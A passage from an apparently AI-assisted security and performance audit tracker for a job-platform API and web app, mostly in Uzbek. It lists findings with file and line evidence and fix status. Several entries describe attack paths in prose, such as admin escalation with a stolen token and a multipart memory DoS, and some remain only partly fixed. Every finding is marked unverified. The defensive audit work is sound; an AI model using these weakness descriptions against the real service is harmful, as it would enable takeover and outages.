- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** authz/admin-roles
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:217`
- **Root cause:** PATCH /api/admin/users/:id/role 'admin' ni qabul qiladi, /block istalgan nishonni; yagona tekshiruv 'o'zingiz emas'. Team PATCH ham shunday. Parol qayta so'ralmaydi, oxirgi faol admin himoyalanmaydi, boshqa adminlarga xabar yo'q. Web'dagi 'Admin qilish' tugmasi foydalanuvchi va rolni aytmaydigan umumiy confirm ishlatadi.
- **Impact:** O'g'irlangan admin access tokeni (localStorage, web'da CSP yo'q) hujumchi hisobini admin qilish va boshqa barcha adminlarni bloklash uchun yetarli (har blok ularning sessiyasini ham bekor qiladi). ensure-admin faqat rolni tiklaydi, isBlocked ni emas, shuning uchun nazoratni qaytarish DB kirishini talab qiladi.
- **Evidence:** admin.routes.ts:190-194, 217-226; team.routes.ts:168-216 (:182-184 faqat self); web admin/users/+Page.tsx:45-47 `window.confirm(t.admin.common.confirmAction)`, :151-154 makeAdmin.
- **Recommended fix:** Admin berish yoki olish va adminni bloklashdan oldin qayta autentifikatsiya talab qiling (joriy parol -> qisqa muddatli elevated token). Oxirgi bloklanmagan adminni bloklash yoki pasaytirishni rad eting. Foydalanuvchi va rolni nomlaydigan confirm ishlating (TeamList.tsx:43 kabi), security event yozing va boshqa adminlarni xabardor qiling.
- **Severity izohi:** P2 saqlandi. ISSUE-035/108 rolni DB'dan o'qishni tuzatgan; bu bo'shliq tracker'da yo'q.
- **Manba topilmalar:** auth-core-10, admin-staff-5
- **Bajarilgan fix:** auth-core-10: PARTIAL — Last active admin can no longer be blocked or demoted (409 LAST_ADMIN) in both admin.routes.ts and team.routes.ts, and every change still writes role_changed/user_blocked + session | admin-staff-5: PARTIAL — Last-admin guard done; admin actions now use name-specific confirmations. No step-up re-auth (D-077 alternative rejected); the role-grant confirm lives in pages/admin/users which i
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-218

**Admin rol o'zgarishi nomuvofiq holat qoldiradi: ish beruvchidan olingan rolda faol vakansiyalar qoladi, staff rollari users sahifasida modellashtirilmagan**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** admin-staff/users
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:221`
- **Root cause:** Role route faqat rolni yangilaydi va sessiyalarni bekor qiladi. Blok'dan farqli ravishda egasining faol vakansiyalarini arxivlamaydi, shuning uchun job_seeker ga o'tgan employer boshqara olmaydigan jonli vakansiyalar qoladi. Users route enum'lari content_editor/content_author ni o'z ichiga olmaydi, jadval esa staff qatorlarida seeker/employer qilish tugmalarini ko'rsatadi.
- **Impact:** Nomzodlar egasiga yetib bo'lmaydigan vakansiyalarga ariza berishda davom etadi. Xodimlar team oqimidan tashqarida jimgina seeker yoki employer'ga aylantiriladi, staffProfile va maqola mualliflik ma'lumoti eskirib qoladi.
- **Evidence:** admin.routes.ts:221-225 vakansiya ishlovisiz; :203-211 blokdagi arxivlash; :137, :219 role enum; applications.routes.ts:310 va vacancies.routes.ts:273 requireRole('employer','admin'); admin/users/+Page.tsx:60-64, 151-165.
- **Recommended fix:** Employer roldan chiqqanda faol vakansiyalarni arxivlab indeksni sinxronlang (blok qismini qayta ishlating) yoki faol vakansiyalar bo'lsa rad eting. Staff qatorlarini users route rol amallaridan chiqarib /admin/team ga yo'naltiring, staff rollarini filtr va label'larga qo'shing.
- **Severity izohi:** P2 saqlandi.
- **Manba topilmalar:** admin-staff-7
- **Bajarilgan fix:** admin-staff-7: PARTIAL — Orphaned active vacancies fixed (archived + locked + search index synced). Staff roles are still not expressible in PATCH /api/admin/users/:id/role (enum job_seeker|employer|admin)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-219

**Yuklangan PDF rezyume web UI'da employer'ga hech qachon yetib bormaydi; uning doimiy havolasini faqat ishlatilmaydigan endpoint qaytaradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** functional/uploads
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:198`
- **Root cause:** Employer UI GET /api/employer/applications ni yuklaydi, uning jobSeekerProfile select'ida resumeUrl yo'q va web adapter'da fayl maydoni yo'q. resumeUrl ni faqat GET /api/vacancies/:id/applications qaytaradi, uni web chaqirmaydi.
- **Impact:** Nomzodlar rezyume wizard'ida PDF yuklaydi, lekin ariza bergan ish beruvchilar uni ko'rmaydi. Shu bilan birga xom per-vacancy API'ni chaqirgan kishi doimiy public havola oladi. Kirish legitim auditoriya uchun yo'q, boshqalar uchun esa juda keng.
- **Evidence:** applications.routes.ts:194-205 (resumeUrl yo'q) vs :287-294 `resumeUrl: true`; apps/web/src da resumeUrl faqat profil komponentlarida (ResumeFile.tsx:84, ProfileOverview.tsx:88, useProfileData.ts:113), employer kodida yo'q.
- **Recommended fix:** Mahsulot oqimini hal qiling. Employer PDF'ni ko'rishi kerak bo'lsa: hasResumeFile boolean va arizaga bog'langan avtorizatsiyali yuklab olish endpointi (oldingi issue), employer ApplicationDetail'da 'PDF yuklab olish' amali. Aks holda resumeUrl ni /api/vacancies/:id/applications dan olib tashlang.
- **Severity izohi:** P2 saqlandi. ISSUE-029 Dependencies'da employer sahifasi eslatilgan, lekin root cause alohida (funksional bo'shliq).
- **Manba topilmalar:** files-xss-2
- **Bajarilgan fix:** files-xss-2: FIXED — Web half done: the candidate opens their own PDF through /api/resume-files/me and the employer through /api/resume-files/application/:id (helper shared with the perf group's Applic
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-220

**Multipart parser fayldan oldingi cheksiz fayl bo'lmagan maydonlarni xotirada saqlaydi (login qilgan foydalanuvchi uchun memory DoS)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** security/uploads
- **Fayl:** `apps/api/src/server.ts:140`
- **Root cause:** Multipart faqat {fileSize 5MB, files 1} bilan ro'yxatdan o'tgan. @fastify/multipart 8.3.1 parts sukuti 1000, @fastify/busboy fieldSize sukuti 1MB va fields Infinity. onField har bir qiymatni xotiradagi body obyektida saqlaydi, req.file() birinchi faylgacha maydonlarni o'tkazib yuboradi. bodyLimit multipart stream'ga qo'llanmaydi.
- **Impact:** Taxmin, ishga tushirilmagan: /api/profile/resume yoki logo endpointiga fayldan oldin ~999 ta 1MB maydon yuborilgan bitta so'rov ~1GB satrni xotirada ushlab turadi. Bu yagona Railway nusxasini OOM qilib platformani to'xtatishi mumkin. 20/min route limiti bitta so'rov xotirasini cheklamaydi.
- **Evidence:** server.ts:140 `register(multipart, { limits: { fileSize: 5 * 1024 * 1024, files: 1 } })`; node_modules/@fastify/multipart/index.js:51 `parts: options.limits?.parts || 1000`; @fastify/busboy/lib/types/multipart.js:56 fieldSize 1MB, :59 fields Infinity.
- **Recommended fix:** Aniq limitlar qo'ying: { fileSize: 5MB, files: 1, fields: 5, fieldSize: 1024, parts: 6, headerPairs: 50 }. Ixtiyoriy: saveUpload chaqiruvchilarida fayl bo'lmagan qismlarni rad eting.
- **Severity izohi:** P2 saqlandi, ishonch o'rtacha (kutubxona sukutlari tasdiqlandi, hujum sinalmagan). ISSUE-043 rate-limit va tur tekshiruvini tuzatgan, maydon limitlarini emas.
- **Manba topilmalar:** files-xss-3
- **Bajarilgan fix:** files-xss-3: FIXED — multipart limits set to fileSize 5MB, files 1, fields 10, fieldSize 1024, parts 12, headerPairs 50. The web only ever appends the single 'file' part, so no caller breaks.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-221

**CORS preflight keshlanmaydi: har autentifikatsiyalangan brauzer so'rovi qo'shimcha OPTIONS aylanishini to'laydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** cors/performance
- **Fayl:** `apps/api/src/server.ts:117`
- **Root cause:** CORS maxAge'siz ro'yxatdan o'tgan. Plugin sukuti null, shuning uchun Access-Control-Max-Age yuborilmaydi va brauzer preflight'ni URL bo'yicha ~5 soniya keshlaydi. Web va API har xil origin'da va har so'rov Bearer yoki JSON body bilan boradi.
- **Impact:** Login qilingan sahifalar (dashboard, chat, bildirishnomalar) taxminan ikki barobar aylanish qiladi. O'zbekistondan Railway regioniga har bir alohida URL uchun ~100-250 ms qo'shimcha kechikish (taxminiy) va yagona API nusxasiga qo'shimcha so'rovlar.
- **Evidence:** server.ts:117-127 `register(cors, { origin(...), credentials: true })` maxAge yo'q; node_modules/@fastify/cors/index.js:18 `maxAge: null`, :248-249.
- **Recommended fix:** maxAge: 600 qo'shing (Chrome 7200 gacha cheklaydi). Uzoq muddatda same-site API yoki web origin orqali /api proxy preflight'ni butunlay yo'qotadi.
- **Severity izohi:** P2 saqlandi (performance).
- **Manba topilmalar:** headers-infra-9
- **Bajarilgan fix:** headers-infra-9: FIXED — CORS maxAge 600 added, so authenticated browser calls stop paying an OPTIONS round trip each time.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-222

**Web'da COOP same-origin Google Sign-In popup callback'ini buzishi mumkin**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** headers/coop
- **Fayl:** `apps/web/vercel.json:26`
- **Root cause:** Barcha web javoblari Cross-Origin-Opener-Policy: same-origin yuboradi. SocialLogin GIS initialize + renderButton'ni JS callback bilan, ux_mode'siz (sukut popup) ishlatadi. Google popup oqimlari uchun same-origin-allow-popups ni tavsiya qiladi, chunki same-origin popup bilan sahifa bog'lanishini uzadi. GIS hujjatlaridan xulosa, brauzerda sinalmagan.
- **Impact:** Parol bilan birga yagona asosiy kirish usuli bo'lgan Google login GIS FedCM o'rniga popup ishlatadigan joyda (ehtimol Chromium bo'lmagan brauzerlar) jimgina ishlamasligi mumkin: popup yopiladi, callback chaqirilmaydi.
- **Evidence:** vercel.json:26 `Cross-Origin-Opener-Policy: same-origin`; api/ssr.js:18; server/index.mjs:43; SocialLogin.tsx:49-69 google.accounts.id.initialize({client_id, callback}) + renderButton; ISSUE-042 'Google bilan e2e yo'q'.
- **Recommended fix:** Preview deploy'da Safari va Firefox'da Google login'ni sinang. Ishlamasa, kamida auth sahifalarida same-origin-allow-popups yuboring yoki tugma uchun FedCM'ni yoqing (use_fedcm_for_button).
- **Severity izohi:** P2, ishonch o'rtacha. Tasdiqlansa P1 ga ko'tarilishi kerak (asosiy login usuli).
- **Manba topilmalar:** headers-infra-10
- **Bajarilgan fix:** headers-infra-10: FIXED — Verified: Cross-Origin-Opener-Policy is same-origin-allow-popups in all four header sources (vercel.json, vite.config.ts dev/preview, server/index.mjs, api/ssr.js), so the GIS popu
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-223

**Global per-IP rate limit SSR'ni ham cheklaydi: SSR API'ga umumiy Vercel egress IP'laridan keladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** rate-limit/ssr
- **Fayl:** `apps/api/src/server.ts:129`
- **Root cause:** Global limit req.ip bo'yicha 600/min. SSR data so'rovlari API'ni to'g'ridan-to'g'ri, mijoz IP'si yoki ishonchli SSR identifikatorisiz chaqiradi, shuning uchun bitta egress IP'dagi barcha SSR trafigi bitta bucket'ni bo'lishadi. env.ts izohi buni tan oladi va faqat limitni oshiradi.
- **Impact:** Googlebot yoki foydalanuvchilar o'n minglab vakansiya va kompaniya sahifalarini ochganda (SSR sahifa uchun ~3-4 API chaqiruv) egress IP bo'yicha 600/min oshib ketishi mumkin: API 429 qaytaradi, SSR xato yoki bo'sh sahifa ko'rsatadi. Vercel egress bo'lishilishi o'lchanmagan (taxmin). Oddiy XFF forward qilish esa TRUST_PROXY=true bilan mijozga kalitni soxtalashtirishga imkon beradi.
- **Evidence:** server.ts:129-139 allowList yoki keyGenerator yo'q; env.ts:54-56 izoh; apps/web/src/lib/api.ts:75-77 `fetch(`${API_URL}${path}`, ...)` mijoz IP sarlavhasisiz.
- **Recommended fix:** SSR faqat serverda saqlanadigan maxfiy sarlavha (VITE_ emas) yuborsin; rate limiter SSR'ni allowList qilsin yoki imzolangan mijoz IP bo'yicha kalitlasin. Brauzer uchun qattiq per-IP limitlar qolsin, ochiq javoblarni keshlang.
- **Severity izohi:** P2 saqlandi, ishonch o'rtacha.
- **Manba topilmalar:** headers-infra-11
- **Bajarilgan fix:** headers-infra-11: FIXED — Same SSR bucket as scale-10k-1; browser per-IP limits unchanged.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-224

**Zaxira telefon (F qoidasi) tasdiqlanmagan, yagona emas, erkin matn**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** telegram/backup-phone
- **Fayl:** `apps/api/src/modules/profile/profile.routes.ts:16`
- **Root cause:** additionalPhone JobSeekerProfile'dagi max 30 belgili satr: format, tasdiq va yagonalik yo'q. Ish beruvchida bunday maydon umuman yo'q. Asosiy telefon ham tasdiqlanmaguncha istalgan satr sifatida normallashtirilmasdan saqlanadi.
- **Impact:** F qoidasi (Telegram orqali tasdiqlangan, yagona, tiklash uchun yaroqli zaxira telefon) bajarilmaydi. Tiklash kelajakda shu maydonga ulansa, o'g'irlangan access token bilan hujumchi o'z raqamini zaxira qilib qo'yadi.
- **Evidence:** schema.prisma:217 `additionalPhone String?`; profile.routes.ts:15-16 z.string().max(30); :65-67 tasdiqlanmagan phone yoziladi; :74 additionalPhone saqlanadi.
- **Recommended fix:** User'da alohida backupPhone: Telegram challenge orqali tasdiqlanadi, asosiy telefon bilan bir xil yagonalik qoidasiga bo'ysunadi, audit event va asosiy kanalga xabarnoma bilan. Tasdiqlanmagan raqam orqali hech qachon tiklamang. Serverda E.164 ga normallashtiring va eski additionalPhone qiymatlarini migratsiya qiling.
- **Severity izohi:** P2 saqlandi: tiklash oqimi hali yo'q, shuning uchun hozir bevosita ekspluatatsiya qilinmaydi.
- **Manba topilmalar:** telegram-14
- **Bajarilgan fix:** telegram-14: PARTIAL — Done in my scope: profile PATCH validates and normalises both phone fields, refuses to change a verified primary phone (409 USE_PHONE_CHANGE) and documents additionalPhone as an un
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-225

**Ommaviy xabar jarayon xotirasida fire-and-forget: bardoshli yozuv, progress va davom ettirish yo'q**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** admin-staff/broadcast
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:556`
- **Root cause:** Qulf modul o'zgaruvchisi, yuborish sikli ajratilgan async IIFE. Broadcast haqida hech narsa (kim yubordi, matn, auditoriya, cursor, delivered, failed) saqlanmaydi. Javob maqsadli sonni 'sent' deb qaytaradi va UI uni yuborilgan deb ko'rsatadi. Har foydalanuvchi uchun tashqi kanallar kutiladi va kamida 40 ms oraliq bor.
- **Impact:** 10k foydalanuvchida bir yuborish kamida 400 soniya, SMTP/Telegram kechikishi bilan ancha ko'p (taxmin). Railway redeploy yoki crash yetkazishni jimgina kesadi. Adminlar progressni ko'rmaydi, qayta yuborish esa oldin olganlarga dublikat beradi. Bir nechta nusxada qulf ishlamaydi.
- **Evidence:** admin.routes.ts:51-53 `let broadcastRunning = false`; :556-588 void IIFE; :582 faqat log.info({ delivered }); :590 `reply.status(202).send({ sent: total })`.
- **Recommended fix:** Broadcast hujjatini saqlang (actorId, title, body, audience, status, lastId, delivered, failed, vaqtlar). Qulfni shartli DB update bilan oling, boot'da lastId'dan davom eting, overview'da holat va progressni ko'rsating, UI sonini 'navbatga qo'yildi' deb belgilang va yuborishni audit qiling.
- **Severity izohi:** P2 saqlandi. ISSUE-054/112 sinxron siklni fonga o'tkazgan va tezlikni cheklagan; bardoshlilik alohida root cause.
- **Manba topilmalar:** admin-staff-10
- **Bajarilgan fix:** admin-staff-10: WONT FIX — Lead decision: a durable broadcast needs a queue or job collection, which the round's brief forbids. The in-process single-run guard, batching and 40 ms pacing stay as they are.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-226

**Admin ro'yxat qidiruvi relation filtr va langarsiz regex ishlatadi, har so'rovda ikki marta bajariladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** admin-staff/performance
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:147`
- **Root cause:** User qidiruvi email/phone contains'ni jobSeekerProfile.firstName/lastName relation filtrlari bilan OR qiladi, vakansiya qidiruvi company.name relation filtrini ishlatadi. Har where findMany va count uchun ikki marta ishlaydi. Prisma Mongo'da relation filtrlarni har hujjat uchun $lookup pipeline'iga aylantiradi. Vakansiya ro'yxati createdAt bo'yicha indekssiz saralanadi.
- **Impact:** 10k foydalanuvchi va o'n minglab vakansiyada har admin qidiruvi hujjat bo'yicha lookup bilan ikki to'liq kolleksiya skan qiladi (bir necha soniyalik kechikish va DB yuki, taxmin). Chuqur skip sahifalari ham sekin.
- **Evidence:** admin.routes.ts:143-151 `{ jobSeekerProfile: { firstName: like(query.text) } }`; :241-243 `{ company: { name: like(query.text) } }`; :246-258 findMany + count; articles.admin.routes.ts:216-229 buni ikki bosqichli qidiruv bilan chetlab o'tgan.
- **Recommended fix:** articles.admin.routes.ts kabi ikki bosqichli qidiruv: avval cheklangan so'rov bilan profil userId va kompaniya id'larini oling, keyin id `in` bo'yicha filtrlang. Normallashtirilgan email va telefon uchun aniq moslik tezkor yo'li. Vakansiyalarni id bo'yicha saralang yoki createdAt indeksini qo'shing.
- **Severity izohi:** P2 saqlandi, ishonch o'rtacha. ISSUE-045 boshqa endpoint'dagi xuddi shu naqsh.
- **Manba topilmalar:** admin-staff-11
- **Bajarilgan fix:** admin-staff-11: FIXED — User search resolves jobSeekerProfile userIds first (bounded 1000) and filters by id in; the where clause no longer contains a relation filter for either findMany or count. Regex m
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-227

**Xodim va bootstrap admin hisoblarida telefon yo'q: Telegram orqali tiklash ular uchun hech qachon ishlamaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** admin-staff/recovery
- **Fayl:** `apps/api/src/modules/team/team.routes.ts:250`
- **Root cause:** Taklifni qabul qilish hisobni telefon va Telegramsiz (email, parol, isEmailVerified:true) yaratadi, ensure-admin ham xuddi shunday. Admin va xodim guard'lari isPhoneVerified ni talab qilmaydi. Admin uchun hujjatlashtirilgan yagona tiklash yo'li hisobni bazadan o'chirish.
- **Impact:** B/E qoidalariga ko'ra eng yuqori huquqli hisoblar parolni umuman tiklay olmaydi. Taklif qilingan bazadan o'chirish kaskad bilan ma'lumotlarni o'chiradi va ADMIN_EMAIL bilan avtomatik ko'tarish poygasini ochadi.
- **Evidence:** team.routes.ts:250-257 user.create phone'siz; ensure-admin.ts:12-14 'avval hisobni bazadan o'chiring', :40-46; admin.routes.ts:25 requireStaff('admin') telefon tekshiruvisiz.
- **Recommended fix:** Xodimlar /admin ga birinchi kirishda Telegram orqali asosiy telefonni tasdiqlasin (tasdiq ekraniga yo'naltiruvchi grace yo'l bilan). Ular qo'lda tiklash oqimiga ham kiritilsin. ensure-admin izohidagi 'bazadan o'chiring' maslahatini olib tashlang. Gate yoqilishidan oldin mavjud adminlarni onboard qiling.
- **Severity izohi:** P2 saqlandi: tiklash oqimi hali yo'q; u qurilganda staff uchun bo'shliq yuzaga chiqadi. ISSUE-012/D-010 bilan bog'liq.
- **Manba topilmalar:** admin-staff-8
- **Bajarilgan fix:** admin-staff-8: PARTIAL — Staff and bootstrap admin accounts can now recover through the manual flow (it works by email and does not require an existing phone), and approve clears whatever identity exists. 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-228

**Admin qidiruvi relation filter bilan butun kolleksiya ustida; vakansiya createdAt sort'i indekssiz; chuqur skip; overview qatorlarni Node'ga yuklaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** scale/admin
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:239`
- **Root cause:** Admin vakansiya qidiruvi OR ichida company.name, user qidiruvi jobSeekerProfile.firstName/lastName relation filtrini ishlatadi — har hujjat uchun $lookup; ikkalasi findMany + count bilan ikki marta. Vacancy va Company'da createdAt indeksi yo'q. pageSchema page<=10 000, pageSize<=100. Overview 14 kunlik barcha user va ariza createdAt'ini JS'da kunlarga bo'ladi, isBlocked/isVerified count'lari indekssiz.
- **Impact:** 20k vakansiya va 10k user ustida moderator qidiruvi D-033'dan oldingi 3.5 s ga o'xshash sekin bo'lishi mumkin (inference, o'lchanmagan); filtrsiz vakansiya ro'yxati har yuklashda 20k hujjatni sort qiladi; overview faol ikki haftada o'n minglab qator tashiydi. Faqat admin, foydalanuvchiga ta'sir cheklangan.
- **Evidence:** admin.routes.ts:27-31 page max 10_000; :143-151 OR jobSeekerProfile; :239-244 OR company{name}; :249 orderBy createdAt; :91,:93 isBlocked/isVerified count; :107-113 findMany createdAt>=since. schema.prisma:440-446 Vacancy createdAt indeksi yo'q; :337-339 Company ham.
- **Recommended fix:** Kompaniya ID'larini nom bo'yicha va profil userId'larini ism bo'yicha avval (cheklangan, ~500) aniqlab indeksli id in bilan filtrlang (resolveFilterIds kabi). Vacancy @@index([createdAt]) va [status, createdAt], Company [createdAt]. page'ni ~200 bilan cheklang yoki keyset. Overview grafigini aggregateRaw $group ($dateToString, timezone Asia/Tashkent) bilan hisoblang va 60 s keshlang.
- **Severity izohi:** scale-10k-12 P2 bergan; P3 tanlandi — faqat admin ichki yo'li, o'lchanmagan. ISSUE-052 faqat overview indeks qismini tuzatgan, qidiruv relation filterlari yangi.
- **Manba topilmalar:** db-perf-15, scale-10k-12, scale-10k-17
- **Bajarilgan fix:** db-perf-15: PARTIAL — Relation filters over whole collections are gone and search text is bounded. Deep skip is still allowed (page max 10 000 on admin lists) and the admin createdAt sort still has no i | scale-10k-12: PARTIAL — Relation filters ($lookup per document) removed from both admin searches. The createdAt index for the admin sort needs an additive index in apps/api/prisma/schema.prisma, which thi | scale-10k-17: NOT FIXED — P3, deliberately skipped: an honest fix needs a $group/$dateToString aggregation (raw command, timezone Asia/Tashkent) plus a partial index on is_blocked, i.e. raw Mongo plus a sch
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-229

**Reconnect backoff'da jitter yo'q: deploy'dan keyin barcha klientlar bir paytda qayta ulanib to'liq qayta yuklaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** realtime/performance
- **Fayl:** `apps/web/src/lib/useChatSocket.ts:50`
- **Root cause:** Ikkala hook'da kechikish qat'iy min(30s, 1000*2^attempt). SIGTERM'da app.close() @fastify/websocket preClose orqali barcha klientlarni birdan yopadi. Har klient 1/2/4 s jadvalida qayta ulanadi; har ulanish user findUnique, har qayta ochilish to'liq REST reload (suhbatlar ro'yxati, 1000 xabar, bildirishnomalar) chaqiradi.
- **Impact:** Har Railway deploy yoki restart'da sinxron portlash: tab uchun 2 tagacha socket va har ochiq /messages tab uchun og'ir /api/conversations agregatsiyasi ~1 s ichida. Umumiy NAT ortidagi foydalanuvchilarda per-IP limit ham ishga tushishi mumkin (inference).
- **Evidence:** useChatSocket.ts:50 va useNotifications.ts:93 `Math.min(30_000, 1000 * 2 ** attempt)`, Math.random yo'q. node_modules/@fastify/websocket/index.js:22,158 defaultPreClose hook. chat.routes.ts:204 har ulanishda lookup. useMessenger.ts:218-223 reloadList + loadThread.
- **Recommended fix:** Full jitter (delay = random(0, cap)), reconnect'dan keyingi reload oldidan 0-3 s tasodifiy kutish, reload'ni inkremental qiling (oxirgi createdAt'dan keyingilar). Shutdown'da 1012 kodi bilan yoping, klient uzunroq tasodifiy kechikish qo'llasin.
- **Severity izohi:** P2 dan P3 ga tushirildi: maqsad concurrent yuk emas; 10k ro'yxatdagi foydalanuvchida bir vaqtdagi socketlar yuzlab, portlash boshqariladigan.
- **Manba topilmalar:** realtime-7
- **Bajarilgan fix:** realtime-7: FIXED — Ikkala socket xuki (chat va qo'ng'iroq) endi to'liq jitter ishlatadi: delay = random(0, min(30s, 1000*2^attempt)). Qayta ulangandan keyingi og'ir so'rovlar (suhbatlar ro'yxati, tar
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-230

**Yo'qolgan ack + 'Qayta yuborish' dublikat xabar yaratadi: server clientId bo'yicha idempotent emas**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** realtime/chat
- **Fayl:** `apps/web/src/lib/messages/useMessenger.ts:103`
- **Root cause:** Server clientId'ni qaytaradi, lekin saqlamaydi va dublikatni tekshirmaydi. Server xabarni saqlagandan keyin echo kelmasdan socket uzilsa klient 10 s da pufakni failed qiladi. Reconnect reload server qatorlari bilan barcha lokal sent bo'lmagan qatorlarni birlashtiradi, retry ikkinchi nusxani saqlaydi.
- **Impact:** Yuboruvchi xabarini ikki marta ko'radi (bittasi yuborilgan, bittasi xato). Retry bosilsa qabul qiluvchi dublikat oladi; mobil tarmoqda ehtimoli yuqori.
- **Evidence:** schema.prisma:543-558 Message'da clientId yo'q. chat.routes.ts:62-80 deliverMessage clientId'ni faqat echo'da ishlatadi. useMessenger.ts:103-111 `local = items.filter(m => m.status !== 'sent')` → [...items, ...local]; :234-240 timeout; :269-275 retry → dispatch.
- **Recommended fix:** Message'ga clientId qo'shing ([senderId, clientId] sparse unique) va takrorda mavjud qatorni qaytaring. History REST javobiga clientId'ni kiritib reload'da lokal pufaklarni moslang.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** realtime-12
- **Bajarilgan fix:** realtime-12: PARTIAL — Klient tomoni: tarix qayta yuklanganda serverga yetib borgan mahalliy pufak (server javobidagi clientId bo'yicha, bo'lmasa — o'zim yuborgan, bir xil matnli va -60s..+10 daqiqa oral
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-231

**WS frame'lari parallel qayta ishlanadi: tez ketma-ket xabarlar noto'g'ri tartibda saqlanishi mumkin**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** realtime/chat
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:281`
- **Root cause:** Har 'message' hodisasi handle()'ni mustaqil boshlaydi; umumiy ready'dan keyin har frame o'z participantsOf lookup'i va message.create'ini bajaradi, shuning uchun yaratish tartibi kelish tartibiga emas, DB vaqtiga bog'liq.
- **Impact:** Ketma-ket yuborilgan ikki xabar ikkala tomonda almashgan createdAt tartibida saqlanib ko'rsatilishi mumkin (inference: DB kechikish farqiga bog'liq).
- **Evidence:** chat.routes.ts:281-284 `ws.on('message', raw => handle(raw).catch(...))`; :259 har frame participantsOf; :278 deliverMessage.
- **Recommended fix:** Ulanish ichida promise zanjiri bilan ketma-ketlashtiring (queue = queue.then(() => handle(raw))) va conversationId bo'yicha ishtirokchilarni ulanish umri davomida keshlang.
- **Severity izohi:** P3 saqlandi, medium confidence.
- **Manba topilmalar:** realtime-13
- **Bajarilgan fix:** realtime-13: FIXED — WS frames are chained onto one per-connection promise queue, so two quickly typed messages are saved in the order they arrived; a thrown handler only logs and does not break the ch
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-232

**Socket sessiya tekshiruvi tugashidan oldin ro'yxatga olinadi va jonli payload oladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** realtime/auth
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:199`
- **Root cause:** addSocket imzo tekshiruvidan so'ng darhol chaqiriladi, blocked/tokenVersion lookup keyin tugaydi. Faqat kiruvchi frame'lar ready'ni kutadi; sendToUser va notify() socketga darhol yozadi va isOnline true bo'ladi.
- **Impact:** Imzosi to'g'ri, lekin sessiyasi bekor qilingan token (o'g'irlangan, logout'dan keyin) qayta-qayta ulanib har DB round-trip oynasida jonli xabar va bildirishnomalarni oladi; shu oyna Telegram fallback'ini ham o'chiradi. Ekspozitsiya kichik, lekin nol emas.
